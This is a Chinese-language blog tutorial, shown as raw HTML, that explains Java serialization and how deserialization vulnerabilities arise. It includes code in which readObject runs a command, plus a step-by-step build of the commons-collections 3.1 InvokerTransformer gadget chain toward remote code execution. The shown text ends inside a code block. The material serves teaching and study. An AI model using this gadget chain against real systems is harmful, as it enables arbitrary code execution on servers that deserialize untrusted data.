<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='声明
本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。
序列化的定义
序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。
Java 中的序列化
Java 自身提供了序列化的功能，需要实现 java.io.Serializable 接口，标明该对象是可序列化的。 java.io.Serializable 是一个空接口，不需要对象实现方法。
以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Eval0 {

    public static class Command implements Serializable {
        private String cmd;

        public String getCmd() {
            return cmd;
        }
        public void setCmd(String cmd) {
            this.cmd = cmd;
        }
    }

    public static void main(String[] args) throws Exception {
        // 定义一个对象
        Command command = new Command();
        command.setCmd("calc");
        System.out.println("序列化前: " + command.getCmd());

        // 将用户序列化为字节数组
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) {
            outputStream.writeObject(command);
        }
        // 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化
        final String data = Base64.getEncoder().encodeToString(buffer.toByteArray());
        System.out.println("序列化后: " + data);

        // 将base64编码的数据再解码为字节数组
        final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8));

        // 将字节数组反序列化为对象
        ByteArrayInputStream b = new ByteArrayInputStream(bytes);
        try (ObjectInputStream input = new ObjectInputStream(b)) {
            final Command obj = (Command) input.readObject();
            System.out.println("反序列化: " + obj.getCmd());
        }
    }
}
运行后输出：'><title>Java 反序列化漏洞原理（一）Serializable</title><link rel="shortcut icon" type=image/x-icon href=/><link rel=stylesheet href=/css/main.51652302d3a998bf7887aed5c2cf89141bbebdf45a2c8f87b0717a3cf4f51c4e53c694c328fb1de78c3a625a1c01f80745bf1f2f42c040647a245cbbb6c2d1d7.css integrity="sha512-UWUjAtOpmL94h67Vws+JFBu+vfRaLI+HsHF6PPT1HE5TxpTDKPsd54w6YlocAfgHRb8fL0LAQGR6JFy7tsLR1w=="></head><body a=auto><main class=page-content aria-label=Content><div class=w><div class=post-meta><a href=/>..</a><p><time datetime="2021-10-14 23:00:00 +0800 +0800">2021-10-14</time></p></div><article><h1>Java 反序列化漏洞原理（一）Serializable</h1><h2 id=声明>声明</h2><p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。</p><h2 id=序列化的定义>序列化的定义</h2><p>序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。</p><h2 id=java-中的序列化>Java 中的序列化</h2><p>Java 自身提供了序列化的功能，需要实现 <code>java.io.Serializable</code> 接口，标明该对象是可序列化的。 <code>java.io.Serializable</code> 是一个空接口，不需要对象实现方法。</p><p>以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.StandardCharsets;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval0</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Command</span> <span style=color:#66d9ef>implements</span> Serializable {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> String cmd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getCmd</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> cmd;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setCmd</span>(String cmd) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>cmd</span> <span style=color:#f92672>=</span> cmd;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 定义一个对象</span>
</span></span><span style=display:flex><span>        Command command <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Command();
</span></span><span style=display:flex><span>        command.<span style=color:#a6e22e>setCmd</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;序列化前: &#34;</span> <span style=color:#f92672>+</span> command.<span style=color:#a6e22e>getCmd</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将用户序列化为字节数组</span>
</span></span><span style=display:flex><span>        ByteArrayOutputStream buffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(buffer)) {
</span></span><span style=display:flex><span>            outputStream.<span style=color:#a6e22e>writeObject</span>(command);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> String data <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>().<span style=color:#a6e22e>encodeToString</span>(buffer.<span style=color:#a6e22e>toByteArray</span>());
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;序列化后: &#34;</span> <span style=color:#f92672>+</span> data);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将base64编码的数据再解码为字节数组</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getDecoder</span>().<span style=color:#a6e22e>decode</span>(data.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组反序列化为对象</span>
</span></span><span style=display:flex><span>        ByteArrayInputStream b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(bytes);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectInputStream input <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(b)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> Command obj <span style=color:#f92672>=</span> (Command) input.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;反序列化: &#34;</span> <span style=color:#f92672>+</span> obj.<span style=color:#a6e22e>getCmd</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>运行后输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>序列化前: calc
</span></span><span style=display:flex><span>序列化后: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>反序列化: calc
</span></span></code></pre></div><p>通过代码可以看出来我们并没有指定如何进行序列化和反序列化，都是Java帮助我们实现的，那能不能让我们自己来指定方式呢？答案是肯定的，通过搜索可以得出在对象中增加 <code>writeObject</code> <code>readObject</code> 两个私有方法就可以了，但是为什么可以却没有人说的清楚。</p><h2 id=反序列化漏洞的成因>反序列化漏洞的成因</h2><p>特立独行的程序员是不允许自己使用和其他人一样的序列化和反序列化方式的，但 <code>java.io.Serializable</code> 是一个空接口，没有需要实现的方法，要怎么自定义自己的序列化和反序列化方式呢？他决定通过查看源码来一探究竟，于是他打开IDE，找到 <code>final User obj = (User) input.readObject();</code> 这行代码，点击跳转源码，发现实际上是调用了 <code>Object obj = readObject0(false);</code>，进入 <code>readObject0</code> 的实现中发现原来当目标是对象的时候会调用 <code>readOrdinaryObject</code>，他接着看了下去，发现只实现 <code>java.io.Serializable</code> 的对象会调用 <code>readSerialData(obj, desc);</code> 这行代码，而 <code>readSerialData</code> 方法中又会调用 <code>slotDesc.invokeReadObject(obj, this);</code>，最终是是调用了 <code>readObjectMethod.invoke(obj, new Object[]{ in });</code> ，但<code>readObjectMethod</code>又是从哪里来的呢？他查看了一下引用，原来是 <code>ObjectStreamClass</code> 的构建函数里面初始化的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#a6e22e>ObjectStreamClass</span>(<span style=color:#66d9ef>final</span> Class<span style=color:#f92672>&lt;?&gt;</span> cl) {
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>    cons <span style=color:#f92672>=</span> getSerializableConstructor(cl);
</span></span><span style=display:flex><span>    writeObjectMethod <span style=color:#f92672>=</span> getPrivateMethod(cl, <span style=color:#e6db74>&#34;writeObject&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>&lt;?&gt;[]</span> { ObjectOutputStream.<span style=color:#a6e22e>class</span> },
</span></span><span style=display:flex><span>        Void.<span style=color:#a6e22e>TYPE</span>);
</span></span><span style=display:flex><span>    readObjectMethod <span style=color:#f92672>=</span> getPrivateMethod(cl, <span style=color:#e6db74>&#34;readObject&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>&lt;?&gt;[]</span> { ObjectInputStream.<span style=color:#a6e22e>class</span> },
</span></span><span style=display:flex><span>        Void.<span style=color:#a6e22e>TYPE</span>);
</span></span><span style=display:flex><span>    readObjectNoDataMethod <span style=color:#f92672>=</span> getPrivateMethod(
</span></span><span style=display:flex><span>        cl, <span style=color:#e6db74>&#34;readObjectNoData&#34;</span>, <span style=color:#66d9ef>null</span>, Void.<span style=color:#a6e22e>TYPE</span>);
</span></span><span style=display:flex><span>    hasWriteObjectData <span style=color:#f92672>=</span> (writeObjectMethod <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>    ...
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>他恍然大悟，原来只需要在对象中增加一个名为 <code>readObject</code>参数是 <code>java.io.ObjectInputStream</code> 的私有方法就行了，于是他把代码修改为了这个样子</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.StandardCharsets;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Eval1</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Command</span> <span style=color:#66d9ef>implements</span> Serializable {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> String cmd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getCmd</span>() {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> cmd;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setCmd</span>(String cmd) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>cmd</span> <span style=color:#f92672>=</span> cmd;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> in) <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException{
</span></span><span style=display:flex><span>            <span style=color:#75715e>//执行默认的readObject()方法</span>
</span></span><span style=display:flex><span>            in.<span style=color:#a6e22e>defaultReadObject</span>();
</span></span><span style=display:flex><span>            <span style=color:#75715e>//执行命令</span>
</span></span><span style=display:flex><span>            Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>getCmd</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 定义一个对象</span>
</span></span><span style=display:flex><span>        Command command <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Command();
</span></span><span style=display:flex><span>        command.<span style=color:#a6e22e>setCmd</span>(<span style=color:#e6db74>&#34;calc&#34;</span>);
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;序列化前: &#34;</span> <span style=color:#f92672>+</span> command.<span style=color:#a6e22e>getCmd</span>());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将用户序列化为字节数组</span>
</span></span><span style=display:flex><span>        ByteArrayOutputStream buffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(buffer)) {
</span></span><span style=display:flex><span>            outputStream.<span style=color:#a6e22e>writeObject</span>(command);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> String data <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>().<span style=color:#a6e22e>encodeToString</span>(buffer.<span style=color:#a6e22e>toByteArray</span>());
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;序列化后: &#34;</span> <span style=color:#f92672>+</span> data);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将base64编码的数据再解码为字节数组</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getDecoder</span>().<span style=color:#a6e22e>decode</span>(data.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组反序列化为对象</span>
</span></span><span style=display:flex><span>        ByteArrayInputStream b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(bytes);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectInputStream input <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(b)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>final</span> Command obj <span style=color:#f92672>=</span> (Command) input.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;反序列化: &#34;</span> <span style=color:#f92672>+</span> obj.<span style=color:#a6e22e>getCmd</span>());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>运行后输出：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>序列化前: calc
</span></span><span style=display:flex><span>序列化后: rO0ABXNyADdjbi50eXBlc2FmZS5qYXZhc2VyaWFsaXphdGlvbi5zZXJpYWxpemFibGUuRXZhbCRDb21tYW5k+hzZNZkL7qACAAFMAANjbWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABGNhbGM<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>反序列化: calc
</span></span></code></pre></div><p><strong>同时还弹出来了计算器。</strong></p><p>Java 反序列化漏洞的产生原因就是在执行反序列化方法的时候执行了非法的命令，但真的会有程序员这样写代码吗？非要在反序列化方法里面加上执行命令的代码。</p><h2 id=真实环境里面的反序列化漏洞是什么样子的>真实环境里面的反序列化漏洞是什么样子的？</h2><p>以 <code>commons-collections 3.1</code> 版本为例，<code>InvokerTransformer</code> 本来是用来帮助开发人员进行类型转换的，但由于其功能过于灵活，被安全人员发现可以用来执行任意代码。</p><h3 id=瞒天过海>瞒天过海</h3><p>首先我们来看一段简单的代码，用 <code>InvokerTransformer</code> 来实现 <code>Runtime.getRuntime().exec("calc")</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exp0</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 ConstantTransformer 将 Runtime.class 包装一层，等同于  Class&lt;Runtime&gt; runtimeClass = Runtime.class;</span>
</span></span><span style=display:flex><span>        Object runtimeClass <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>).<span style=color:#a6e22e>transform</span>(<span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 InvokerTransformer 调用 runtimeClass 的 getMethod 方法,等同于  Method getRuntime = runtimeClass.getMethod(&#34;getRuntime&#34;, null);</span>
</span></span><span style=display:flex><span>        Object getRuntimeMethod <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>, <span style=color:#66d9ef>null</span>}).<span style=color:#a6e22e>transform</span>(runtimeClass);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 InvokerTransformer 调用getRuntimeMethod 的 invoke 方法,等同于 Object runtime = getRuntime.invoke(null, null);</span>
</span></span><span style=display:flex><span>        Object runtime <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>, Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>).<span style=color:#a6e22e>transform</span>(getRuntimeMethod);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 InvokerTransformer 调用 runtime 的 exec 方法，等同于 runtime.exec(&#34;calc&#34;)</span>
</span></span><span style=display:flex><span>        Object exec <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>}).<span style=color:#a6e22e>transform</span>(runtime);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>InvokerTransformer</code> 构造方法有三个参数，分别为 <strong>方法名称、方法类型数组、方法参数数组</strong>，<strong>方法名称</strong>不用多说，其中第二个<strong>方法类型数组</strong>和第三个<strong>方法参数数组</strong> 的长度必须要相等。</p><p><code>InvokerTransformer</code> 的 <code>transform</code> 方法就是将输入的对象按照构造方法传入的参数转换为另一个对象，没有任何限制，因此即使程序内部没有 <code>Runtime.getRuntime().exec("calc")</code> 这行代码，也通过<code>InvokerTransformer</code>来可实现调用。</p><h3 id=李代桃僵>李代桃僵</h3><p>尽管程序内部没有 <code>Runtime.getRuntime().exec("calc")</code> 这行代码，但是开发人员肯定也不会把上面那一大块代码写到程序里面，因此我们还需要另想办法。首先我们先把代码简化一下，修改为链式调用。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exp1</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>, <span style=color:#66d9ef>null</span>}),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>, Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 把 Transformer 使用链的方式调用，从上到下，不用再每次执行</span>
</span></span><span style=display:flex><span>        Transformer transformerChain <span style=color:#f92672>=</span> ChainedTransformer.<span style=color:#a6e22e>getInstance</span>(transformers);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 调用转换</span>
</span></span><span style=display:flex><span>        transformerChain.<span style=color:#a6e22e>transform</span>(<span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这样我们只需要调用一次 <code>transform</code> 就行了，但是想让目标系统执行我们的代码还是不可能的，因此还需要再寻求其他方式。</p><h3 id=暗渡陈仓>暗渡陈仓</h3><p>有安全人员发现，<code>commons-collections</code> 自己实现了 <code>Map.Entry</code>，并且在 <code>setValue</code> 的时候会先调用 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法，而这个方法又调用了我们传入的 <code>valueTransformer</code> 的 <code>transform</code> 方法，这样一套流程下来，当我们对经过 <code>TransformedMap</code> 转换出来的 <code>Map</code> 做 <code>put</code> 操作的时候，都会触发执行一次我们构造的任意指令。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.TransformedMap;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exp2</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>, <span style=color:#66d9ef>null</span>}),
